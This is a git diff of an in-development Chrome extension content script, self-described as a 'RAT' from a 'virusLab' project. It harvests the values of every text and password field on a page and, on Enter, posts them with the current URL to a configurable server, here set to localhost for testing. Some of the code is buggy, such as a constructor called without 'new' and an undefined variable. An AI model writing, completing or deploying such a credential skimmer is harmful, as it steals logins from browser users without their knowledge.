@@ -1,3 +1,14 @@
+// @todo I really need do this without JQuery, only ChromeAPI and DOM
+// @todo add normal structure (maybe I need to use ECMA6?:D)
+
+
+function sendDataToServer(url, data)
+{
+  JQuery.post(
+    url, data
+  );
+}
+
 function getTextAndPasswordFields() {
   var text_fields = $('input[type="text"]');
   var passwords_fields = $('input[type="password"]');
@@ -22,21 +33,47 @@ function getTextAndPasswordFields() {
     "ts": text_data,
     "ps": password_data
   };
-  return JSON.stringify(data);
+  return data;
 }
 
-function sendDataToServer() {
-  // get current url
-  cur_url = window.location.href;
+function RatInChromeExtension(server) {
+  this._server = server; // it can be make url or email
+  this._data = null;
+  this._client = null; // some info for identification
+  this.getData = null;
+  this.sendData = null;
 }
+
+// this is not a factory :( yet
+function RatInChromeExtensionFactory(server_url, getDataFunction, sendDataFunction) {
+  var rat = RatInChromeExtension(server_url);
+  rat.getData = function() {
+    this._data = getDataFunction();
+  };
+  rat.sendData = function() {
+    data = {
+      "c": this._client,
+      "i": {
+        "curl": window.location.href,
+        "info": this._data
+      }
+    };
+    sendDataFunction(this._server, data);
+  }
+  return rat;
+}
+
+// it's just for testing
+var rat = RatInChromeExtensionFactory(
+  "http://127.0.0.1:8080/work/virusLab/RatInChromeServerSide/", 
+  getTextAndPasswordFields,  sendDataToServer
+);
 
 $(document).keypress(function(e) {
     if(e.which == 13) {
-      var data = getLoginAndPassword();
-      sendEmail();
+      rat.getData();
+      rat.sendData(data);
     }
 });
 
-$("input[type='text']").on("click", function () {
-  
-});
+// @todo add event on submit.click()
